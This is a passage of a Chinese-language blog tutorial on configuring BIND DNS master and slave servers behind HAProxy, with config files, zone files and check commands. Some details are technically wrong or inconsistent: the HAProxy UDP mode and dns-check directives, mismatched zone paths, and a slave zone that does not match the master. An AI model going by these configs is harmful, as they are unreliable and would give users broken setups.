class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 1. 编辑 Haproxy 配置文件</span><br><span class="hljs-attribute">sudo</span> vim /etc/haproxy/haproxy.cfg<br><br><br><span class="hljs-comment"># 2. 写入以下内容</span><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-comment"># Global settings</span><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-attribute">global</span> <br>    <span class="hljs-attribute">log</span>                     <span class="hljs-number">127.0.0.1</span> local2<br>    <span class="hljs-attribute">chroot</span>                  /var/lib/haproxy<br>    <span class="hljs-attribute">pidfile</span>                 /var/run/haproxy.pid<br>    <span class="hljs-attribute">maxconn</span>                 <span class="hljs-number">4000</span><br>    <span class="hljs-attribute">user</span>                    haproxy<br>    <span class="hljs-attribute">group</span>                   haproxy<br>    <span class="hljs-attribute">daemon</span><br>    <span class="hljs-attribute">stats</span> socket            /var/lib/haproxy/stats<br><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-comment"># 默认配置</span><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-attribute">defaults</span><br>    <span class="hljs-attribute">mode</span>                    tcp  # 全局默认设为 tcp，前端按需覆盖为 udp<br>    <span class="hljs-attribute">log</span>                     global<br>    <span class="hljs-attribute">option</span>                  httplog<br>    <span class="hljs-attribute">option</span>                  dontlognull<br>    <span class="hljs-attribute">option</span>                  redispatch<br>    <span class="hljs-attribute">retries</span>                 <span class="hljs-number">3</span><br>    <span class="hljs-attribute">timeout</span> http-request    <span class="hljs-number">10</span>s<br>    <span class="hljs-attribute">timeout</span> queue           <span class="hljs-number">1</span>m<br>    <span class="hljs-attribute">timeout</span> connect         <span class="hljs-number">10</span>s<br>    <span class="hljs-attribute">timeout</span> client          <span class="hljs-number">1</span>m<br>    <span class="hljs-attribute">timeout</span> server          <span class="hljs-number">1</span>m<br>    <span class="hljs-attribute">timeout</span> http-keep-alive <span class="hljs-number">10</span>s<br>    <span class="hljs-attribute">timeout</span> check           <span class="hljs-number">10</span>s<br>    <span class="hljs-attribute">maxconn</span>                 <span class="hljs-number">3000</span><br><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-comment"># DNS 前端配置（UDP 53 和 TCP 53 双监听）</span><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-attribute">frontend</span> dns-udp<br>    <span class="hljs-attribute">mode</span>                    udp<br>    <span class="hljs-attribute">bind</span>                    *:<span class="hljs-number">53</span> proto udp  # 监听 UDP <span class="hljs-number">53</span> 端口<br>    <span class="hljs-attribute">default_backend</span>         dns-servers-udp<br>    <span class="hljs-attribute">option</span>                  tcplog  # 使用 TCP 日志格式（兼容 UDP 基础信息）<br><br><span class="hljs-attribute">frontend</span> dns-tcp<br>    <span class="hljs-attribute">mode</span>                    tcp<br>    <span class="hljs-attribute">bind</span>                    *:<span class="hljs-number">53</span> proto tcp   # 监听 TCP <span class="hljs-number">53</span> 端口<br>    <span class="hljs-attribute">default_backend</span>         dns-servers-tcp<br>    <span class="hljs-attribute">option</span>                  tcplog<br><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-comment"># DNS 后端配置（区分 UDP/TCP 后端）</span><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-attribute">backend</span> dns-servers-udp<br>    <span class="hljs-attribute">mode</span>                    udp<br>    <span class="hljs-attribute">balance</span>                 roundrobin<br>    <span class="hljs-attribute">option</span>                  dns-check query example.com   # DNS 查询级健康检查<br>    <span class="hljs-attribute">server</span>                  dns1 <span class="hljs-number">192.168.136.49:53</span> check inter <span class="hljs-number">2</span>s fall <span class="hljs-number">3</span> rise <span class="hljs-number">2</span><br>    <span class="hljs-attribute">server</span>                  dns2 <span class="hljs-number">192.168.136.51:53</span> check inter <span class="hljs-number">2</span>s fall <span class="hljs-number">3</span> rise <span class="hljs-number">2</span><br><br><span class="hljs-attribute">backend</span> dns-servers-tcp<br>    <span class="hljs-attribute">mode</span>                    tcp<br>    <span class="hljs-attribute">balance</span>                 roundrobin<br>    <span class="hljs-attribute">server</span>                  dns1 <span class="hljs-number">192.168.136.49:53</span> check inter <span class="hljs-number">2</span>s fall <span class="hljs-number">3</span> rise <span class="hljs-number">2</span><br>    <span class="hljs-attribute">server</span>                  dns2 <span class="hljs-number">192.168.136.51:53</span> check inter <span class="hljs-number">2</span>s fall <span class="hljs-number">3</span> rise <span class="hljs-number">2</span><br><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-comment"># 状态页面</span><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-attribute">listen</span> stats<br>    <span class="hljs-attribute">bind</span>                    *:<span class="hljs-number">1080</span><br>    <span class="hljs-attribute">stats</span> uri               /admin?stats<br>    <span class="hljs-attribute">stats</span> realm             HAProxy\\ Statistics<br>    <span class="hljs-attribute">stats</span> auth              admin:awesomePassword<br>    <span class="hljs-attribute">stats</span> refresh           <span class="hljs-number">5</span>s<br><span class="hljs-comment"># 这里需要补一个换行符，按一下 Enter 键 即可</span><br><br><br><br><span class="hljs-comment"># 3. 检查配置文件是否有语法错误</span><br><span class="hljs-attribute">haproxy</span> -c -f /etc/haproxy/haproxy.cfg<br><br><br><span class="hljs-comment"># 4. 重启和开机自启动 Haproxy</span><br><span class="hljs-attribute">sudo</span> systemctl start haproxy &amp;&amp; sudo systemctl enable haproxy<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 Haproxy 状态&#x3D;&#x3D;</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 1. 检查 Haproxy 状态</span><br>sudo systemctl status haproxy<br><br><br><span class="hljs-meta"># 2. 检查 Haproxy 监听的端口</span><br>netstat <span class="hljs-punctuation">-</span>lntup <span class="hljs-string">| grep haproxy</span><br><br><br><span class="hljs-meta"># 3. 访问 Haproxy 状态页面</span><br>http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.136.14:1080/admin?stats</span><br></code></pre></td></tr></table></figure><hr><h3 id="4-检查-VIP-是否正确绑定"><a href="#4-检查-VIP-是否正确绑定" class="headerlink" title="4. 检查 VIP 是否正确绑定"></a>4. 检查 VIP 是否正确绑定</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">ip</span> <span class="hljs-keyword">addr</span> show<br></code></pre></td></tr></table></figure><hr><h3 id="5-配置主服务器"><a href="#5-配置主服务器" class="headerlink" title="5. 配置主服务器"></a>5. 配置主服务器</h3><h4 id="5-1-修改全局配置文件"><a href="#5-1-修改全局配置文件" class="headerlink" title="5.1. 修改全局配置文件"></a>5.1. 修改全局配置文件</h4><p><code>/etc/named.conf</code> 是 BIND 的主配置文件，在主服务器中主要负责以下四大功能：</p><ul><li><font color="#00b0f0">配置监听</font>：指定 BIND 监听的 IP 地址和端口</li><li><font color="#00b0f0">配置递归</font>：指定哪些 IP 地址可以进行递归查询</li><li><font color="#00b0f0">配置同步</font>：配置哪些 IP 地址可以同步区域数据</li><li><font color="#00b0f0">定义区域</font>：为每个需要解析的域名配置一个区域，并指定对应的区域文件<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># ---------------------- 配置监听、配置递归、配置同步 ----------------------</span><br>options &#123;<br>    listen-<span class="hljs-keyword">on</span> port <span class="hljs-number">53</span> &#123; any; &#125;;                          <span class="hljs-comment"># 监听本机所有 IPv4 地址上的 53 端口</span><br>    listen-<span class="hljs-keyword">on</span>-v6 port <span class="hljs-number">53</span> &#123; any; &#125;;                       <span class="hljs-comment"># 监听本机所有 IPv6 地址上的 53 端口</span><br>    directory <span class="hljs-string">&quot;/var/named&quot;</span>;                              <span class="hljs-comment"># BIND 工作目录，存放区域文件、日志及缓存数据</span><br>    dump-<span class="hljs-built_in">file</span> <span class="hljs-string">&quot;/var/named/data/cache_dump.db&quot;</span>;           <span class="hljs-comment"># DNS 缓存数据的持久化存储路径</span><br>    statistics-<span class="hljs-built_in">file</span> <span class="hljs-string">&quot;/var/named/data/named_stats.txt&quot;</span>;   <span class="hljs-comment"># 记录 DNS 服务器运行状态</span><br>    memstatistics-<span class="hljs-built_in">file</span> <span class="hljs-string">&quot;/var/named/data/named_mem_stats.txt&quot;</span>;  <span class="hljs-comment"># 内存使用情况的日志</span><br>    <br>    allow-query &#123; any; &#125;;                                <span class="hljs-comment"># 允许所有 IP 进行 DNS 查询</span><br><br>    recursion yes;                                       <span class="hljs-comment"># 启用递归查询功能</span><br>    allow-recursion &#123;                                    <span class="hljs-comment"># 递归查询白名单</span><br>      <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>;                                  <span class="hljs-comment"># 内网1段:192.168.136.0 - 192.168.136.255</span><br>      <span class="hljs-number">192.168</span><span class="hljs-number">.137</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>;                                  <span class="hljs-comment"># 内网2段:192.168.137.0 - 192.168.137.255</span><br>      &#125;;  <br>      <br>    allow-transfer &#123; <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.8</span>; <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.9</span> &#125;;     <span class="hljs-comment"># 被允许同步所有区域的数据的 IP(可能被覆盖)</span><br>&#125;;<br><br><br><span class="hljs-comment"># ---------------------- 定义区域、配置同步 --------------------</span><br><span class="hljs-comment"># 正向解析：域名 → IP 地址</span><br>zone <span class="hljs-string">&quot;example.local&quot;</span> &#123;  <br>    type master;                                         <span class="hljs-comment"># 主区域，与从服务器的 slave 对应</span><br>    <span class="hljs-built_in">file</span> <span class="hljs-string">&quot;/var/bind9/example.local.db&quot;</span>;                  <span class="hljs-comment"># 存放该区域记录的文件路径</span><br>    allow-transfer &#123; <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.8</span>; &#125;;                   <span class="hljs-comment"># 只允许 192.168.136.8 从本区域同步数据</span><br>&#125;;<br><br><span class="hljs-comment"># 反向解析：IP 地址 → 域名</span><br>zone <span class="hljs-string">&quot;136.168.192.in-addr.arpa&quot;</span> &#123;  <br>    type master;                                         <span class="hljs-comment"># 主区域，与从服务器的 slave 对应</span><br>    <span class="hljs-built_in">file</span> <span class="hljs-string">&quot;/var/bind9/192.168.136.rev&quot;</span>;                   <span class="hljs-comment"># 存放该区域记录的文件路径</span><br>    allow-transfer &#123; <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.8</span>; &#125;;                   <span class="hljs-comment"># 只允许 192.168.136.8 从本区域中同步数据</span><br>&#125;;<br></code></pre></td></tr></table></figure></li></ul><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>136.168.192.in-addr.arpa</code> 中的 <code>in-addr.arpa</code> 是专门为 IPv4 地址反向解析保留的顶级域</li><li>建议仅允许内网进行递归查询，以防止 DNS 放大攻击</li><li>建议仅允许内网 IP 进行 DNS 查询，以提高安全性并防止外部滥用：</li></ol></blockquote><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">allow-query &#123; <br>    <span class="hljs-number">192.168</span>.<span class="hljs-number">136.0</span><span class="hljs-symbol">/24</span>;                    <span class="hljs-comment"># 仅允许 192.168.136.xxx 网段的 IP 进行查询</span><br>    <span class="hljs-number">192.168</span>.<span class="hljs-number">137.0</span><span class="hljs-symbol">/24</span>;                    <span class="hljs-comment"># 仅允许 192.168.137.xxx 网段的 IP 进行查询</span><br>&#125;; <br></code></pre></td></tr></table></figure><hr><h4 id="5-2-编写正向解析区域文件（域名-db）"><a href="#5-2-编写正向解析区域文件（域名-db）" class="headerlink" title="5.2. 编写正向解析区域文件（域名.db）"></a>5.2. 编写正向解析区域文件（域名.db）</h4><p>&#x3D;&#x3D;1.文件模版&#x3D;&#x3D;</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xquery">; 定义 DNS 解析结果在缓存中的存活时间（单位：秒）<br><span class="hljs-variable">$TTL</span>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">TTL</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">; 本区域管理信息（SOA 记录）</span><br><span class="language-xml">@    IN    SOA    <span class="hljs-tag">&lt;<span class="hljs-name">DNS</span> <span class="hljs-attr">服务器</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">管理员邮箱</span>&gt;</span> (</span><br><span class="language-xml">                     <span class="hljs-tag">&lt;<span class="hljs-name">序列号</span>&gt;</span>        ; 每次修改区域数据时需手动递增序列号，标识区域版本</span><br><span class="language-xml">                     <span class="hljs-tag">&lt;<span class="hljs-name">刷新时间</span>&gt;</span>      ; 指示从服务器多久检查一次主服务器以获取更新（单位：秒）</span><br><span class="language-xml">                     <span class="hljs-tag">&lt;<span class="hljs-name">重试时间</span>&gt;</span>      ; 指示从服务器当检查失败后，多久重试一次（单位：秒）</span><br><span class="language-xml">                     <span class="hljs-tag">&lt;<span class="hljs-name">过期时间</span>&gt;</span>      ; 数据在从服务器上保持有效的最长时间，过期后必须重新获取（单位：秒）</span><br><span class="language-xml">                     <span class="hljs-tag">&lt;<span class="hljs-name">最小TTL</span>&gt;</span>       ; 查询失败时，负缓存结果的有效时间，防止频繁查询降低负载（单位：秒）</span><br><span class="language-xml">                   )</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">; 指定该域名的权威 DNS 服务器，所有该域名的解析请求将被转发到该权威服务器处理。</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">域名</span>&gt;</span>    IN    NS    <span class="hljs-tag">&lt;<span class="hljs-name">DNS</span> <span class="hljs-attr">服务器</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">; 本区域的解析记录：将域名映射到对应的 IP 地址</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">主机名</span>&gt;</span>    IN    <span class="hljs-tag">&lt;<span class="hljs-name">记录名</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">IP地址</span>&gt;</span>    </span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：为什么需要手动递增序列号</p><ol><li>从服务器定期查询主服务器，通过比较序列号判断是否需要更新，如果序列号增大，说明需要更新了</li></ol></blockquote><p>&#x3D;&#x3D;2.文件示例&#x3D;&#x3D;</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-meta">$TTL</span>    <span class="hljs-number">604800</span> <br><br><br>@       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">SOA</span>     ns1.example.local. admin.example.local. (<br>                          <span class="hljs-number">2023121801</span><br>                          <span class="hljs-number">604800</span><br>                          <span class="hljs-number">86400</span><br>                          <span class="hljs-number">2419200</span><br>                          <span class="hljs-number">604800</span> )<br><br><br>@       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">NS</span>      ns1.example.local.<br><br><br>@       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>       <span class="hljs-number">192.168.136.8</span>             <span class="hljs-comment">; example.local           -&gt;    192.168.136.8</span><br>ns1     <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>       <span class="hljs-number">192.168.136.8</span>             <span class="hljs-comment">; ns1.example.local       -&gt;    192.168.136.8</span><br>www     <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>       <span class="hljs-number">192.168.1.100</span>             <span class="hljs-comment">; www.example.local       -&gt;    192.168.1.100</span><br>mail    <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>       <span class="hljs-number">192.168.1.101</span>             <span class="hljs-comment">; mail.example.local      -&gt;    192.168.1.101</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>主机名不区分大小写，但通常使用小写字母。</li><li>域名应在末尾加上一个点 <strong>.</strong></li></ol></blockquote><hr><h4 id="5-3-配置反向解析区域文件（ip-rev）"><a href="#5-3-配置反向解析区域文件（ip-rev）" class="headerlink" title="5.3. 配置反向解析区域文件（ip.rev）"></a>5.3. 配置反向解析区域文件（ip.rev）</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$TTL    <span class="hljs-number">604800</span><br><br><br>@       <span class="hljs-keyword">IN</span>      SOA     ns1.example.<span class="hljs-keyword">local</span>. admin.example.<span class="hljs-keyword">local</span>. (<br>                          <span class="hljs-number">2023121801</span><br>                          <span class="hljs-number">604800</span><br>                          <span class="hljs-number">86400</span><br>                          <span class="hljs-number">2419200</span><br>                          <span class="hljs-number">604800</span> )<br><br><br>@       <span class="hljs-keyword">IN</span>      NS      ns1.example.<span class="hljs-keyword">local</span>.<br><br><br><span class="hljs-comment">; 反向解析记录</span><br><span class="hljs-number">1</span>       <span class="hljs-keyword">IN</span>      <span class="hljs-built_in">PTR</span>     ns1.example.<span class="hljs-keyword">local</span>.           <span class="hljs-meta"># 136.168.192.1      -&gt;  ns1.example.local</span><br><span class="hljs-number">100</span>     <span class="hljs-keyword">IN</span>      <span class="hljs-built_in">PTR</span>     www.example.<span class="hljs-keyword">local</span>.           <span class="hljs-meta"># 136.168.192.100    -&gt;  www.example.local</span><br><span class="hljs-number">101</span>     <span class="hljs-keyword">IN</span>      <span class="hljs-built_in">PTR</span>     mail.example.<span class="hljs-keyword">local</span>.          <span class="hljs-meta"># 136.168.192.101    -&gt;  mail.example.local</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 补充：常见主机名与功能对应</p><ol><li><code>PTR</code> 记录用于反向 DNS 查找。</li><li>域名应在末尾加上一个点 <strong>.</strong></li></ol></blockquote><hr><h4 id="5-4-检查配置是否错误"><a href="#5-4-检查配置是否错误" class="headerlink" title="5.4. 检查配置是否错误"></a>5.4. 检查配置是否错误</h4><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs maxima"># <span class="hljs-number">1</span>. 检查 /etc/named.conf 是否有语法错误<br>sudo named-checkconf<br><br><br># <span class="hljs-number">2</span>. 检查 <span class="hljs-built_in">example</span>.<span class="hljs-built_in">local</span> 的区域文件 /<span class="hljs-built_in">var</span>/named/<span class="hljs-built_in">example</span>.<span class="hljs-built_in">local</span>.db 是否正常解析<br>sudo named-checkzone <span class="hljs-built_in">example</span>.<span class="hljs-built_in">local</span> /<span class="hljs-built_in">var</span>/named/<span class="hljs-built_in">example</span>.<span class="hljs-built_in">local</span>.db<br><br><br># <span class="hljs-number">3</span>. 检查 <span class="hljs-number">192.168</span><span class="hljs-number">.136</span> 的区域文件 /<span class="hljs-built_in">var</span>/named/<span class="hljs-number">192.168</span><span class="hljs-number">.136</span>.rev 是否正常解析<br>sudo named-checkzone <span class="hljs-number">136.168</span><span class="hljs-number">.192</span>.<span class="hljs-keyword">in</span>-addr.arpa /<span class="hljs-built_in">var</span>/named/<span class="hljs-number">192.168</span><span class="hljs-number">.136</span>.rev<br></code></pre></td></tr></table></figure><hr><h4 id="5-5-重启主服务器-BIND-DNS-服务"><a href="#5-5-重启主服务器-BIND-DNS-服务" class="headerlink" title="5.5. 重启主服务器 BIND DNS 服务"></a>5.5. 重启主服务器 BIND DNS 服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart bind9<br></code></pre></td></tr></table></figure><hr><h3 id="6-配置从服务器"><a href="#6-配置从服务器" class="headerlink" title="6. 配置从服务器"></a>6. 配置从服务器</h3><h4 id="6-1-修改全局配置文件"><a href="#6-1-修改全局配置文件" class="headerlink" title="6.1. 修改全局配置文件"></a>6.1. 修改全局配置文件</h4><p><code>/etc/named.conf</code> 是 BIND 的主配置文件，在主服务器中主要负责以下四大功能：</p><ul><li><font color="#00b0f0">配置监听</font>：指定 BIND 监听的 IP 地址和端口</li><li><font color="#00b0f0">配置递归</font>：指定哪些 IP 地址可以进行递归查询</li><li><font color="#00b0f0">定义区域</font>：为每个需要解析的域名配置一个区域，并指定对应的区域文件<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-comment">---------------------- 配置监听、配置递归 ----------------------</span><br><span class="hljs-keyword">options</span> &#123;<br>    <span class="hljs-keyword">listen</span>-<span class="hljs-keyword">on</span> port <span class="hljs-number">53</span> &#123; <span class="hljs-keyword">any</span>; &#125;;<br>    <span class="hljs-keyword">listen</span>-<span class="hljs-keyword">on</span>-v6 port <span class="hljs-number">53</span> &#123; <span class="hljs-keyword">any</span>; &#125;;<br>directory &quot;/var/named&quot;;<br>    dump-file &quot;/var/named/data/cache_dump.db&quot;;<br>    <span class="hljs-keyword">statistics</span>-file &quot;/var/named/data/named_stats.txt&quot;;<br>    memstatistics-file &quot;/var/named/data/named_mem_stats.txt&quot;;<br>    <br>    allow-query &#123; <span class="hljs-keyword">any</span>; &#125;;<br>    <br>    recursion yes;                                   <br>    allow-recursion &#123; <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>; <span class="hljs-number">192.168</span><span class="hljs-number">.137</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>; &#125;;<br>&#125;;<br><br><br># <span class="hljs-comment">---------------------- 定义区域 ----------------------</span><br><span class="hljs-type">zone</span> &quot;example.com&quot; <span class="hljs-keyword">IN</span> &#123;<br>    <span class="hljs-keyword">type</span> slave;                                          # 指定为从区域<br>    file &quot;slaves/example.com.db&quot;;                        # 存放从区域数据的文件路径<br>    masters &#123; <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span>; &#125;;                            # 主服务器的 IP 地址（用于区域传送）<br>&#125;;<br></code></pre></td></tr></table></figure></li></ul><hr><h4 id="6-2-检查配置是否错误"><a href="#6-2-检查配置是否错误" class="headerlink" title="6.2. 检查配置是否错误"></a>6.2. 检查配置是否错误</h4><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs maxima"># <span class="hljs-number">1</span>. 检查 /etc/named.conf 是否有语法错误<br>sudo named-checkconf<br><br><br># <span class="hljs-number">2</span>. 检查 <span class="hljs-built_in">example</span>.<span class="hljs-built_in">local</span> 的区域文件 /<span class="hljs-built_in">var</span>/named/<span class="hljs-built_in">example</span>.<span class="hljs-built_in">local</span>.db 是否正常解析<br>sudo named-checkzone <span class="hljs-built_in">example</span>.<span class="hljs-built_in">local</span> /<span class="hljs-built_in">var</span>/named/<span class="hljs-built_in">example</span>.<span class="hljs-built_in">local</span>.db<br><br><br># <span class="hljs-number">3</span>. 检查 <span class="hljs-number">192.168</span><span class="hljs-number">.136</span> 的区域文件 /<span class="hljs-built_in">var</span>/named/<span class="hljs-number">192.168</span><span class="hljs-number">.136</span>.rev 是否正常解析<br>sudo named-checkzone <span class="hljs-number">136.168</span><span class="hljs-number">.192</span>.<span class="hljs-keyword">in</span>-addr.arpa /<span class="hljs-built_in">var</span>/named/<span class="hljs-number">192.168</span><span class="hljs-number">.136</span>.rev<br></code></pre></td></tr></table></figure><hr><h4 id="6-3-重启主服务器-BIND-DNS-服务"><a href="#6-3-重启主服务器-BIND-DNS-服务" class="headerlink" title="6.3. 重启主服务器 BIND DNS 服务"></a>6.3. 重启主服务器 BIND DNS 服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart bind9<br></code></pre></td></tr></table></figure><hr><h3 id="7-客户端使用-BIND-DNS"><a href="#7-客户端使用-BIND-DNS" class="headerlink" title="7. 客户端使用 BIND DNS"></a>7. 客户端使用 BIND DNS</h3><p>&#x3D;&#x3D;1.Linux 系统&#x3D;&#x3D;<br>在 <code>/etc/resolv.conf</code> 文件中添加以下内容：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 指定内部 DNS 服务器地址</span><br><span class="hljs-attribute">nameserver</span> <span class="hljs-number">192.168.136.8</span> <br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.Windows 系统&#x3D;&#x3D;</p><ol><li>打开 <strong>控制面板</strong> -&gt; <strong>网络和共享中心</strong> -&gt; <strong>更改适配器设置</strong>。</li><li>右键点击您的网络适配器，选择 <strong>属性</strong>。</li><li>选择 **Internet 协议版本 4 (TCP&#x2F;IPv4)**，然后点击 <strong>属性</strong>。</li><li>选择 <strong>使用下面的 DNS 服务器地址</strong><ul><li>首选 DNS 服务器：输入你想要使用的 DNS 服务器地址（例如，<code>192.168.136.8</code>）</li><li>备用 DNS 服务器：输入另一个备选的 DNS 服务器地址（例如，<code>8.8.8.8</code>）。</li></ul></li></ol><hr><h3 id="8-测试-DNS-解析"><a href="#8-测试-DNS-解析" class="headerlink" title="8. 测试 DNS 解析"></a>8. 测试 DNS 解析</h3><p>&#x3D;&#x3D;1.Linux 系统&#x3D;&#x3D;</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span 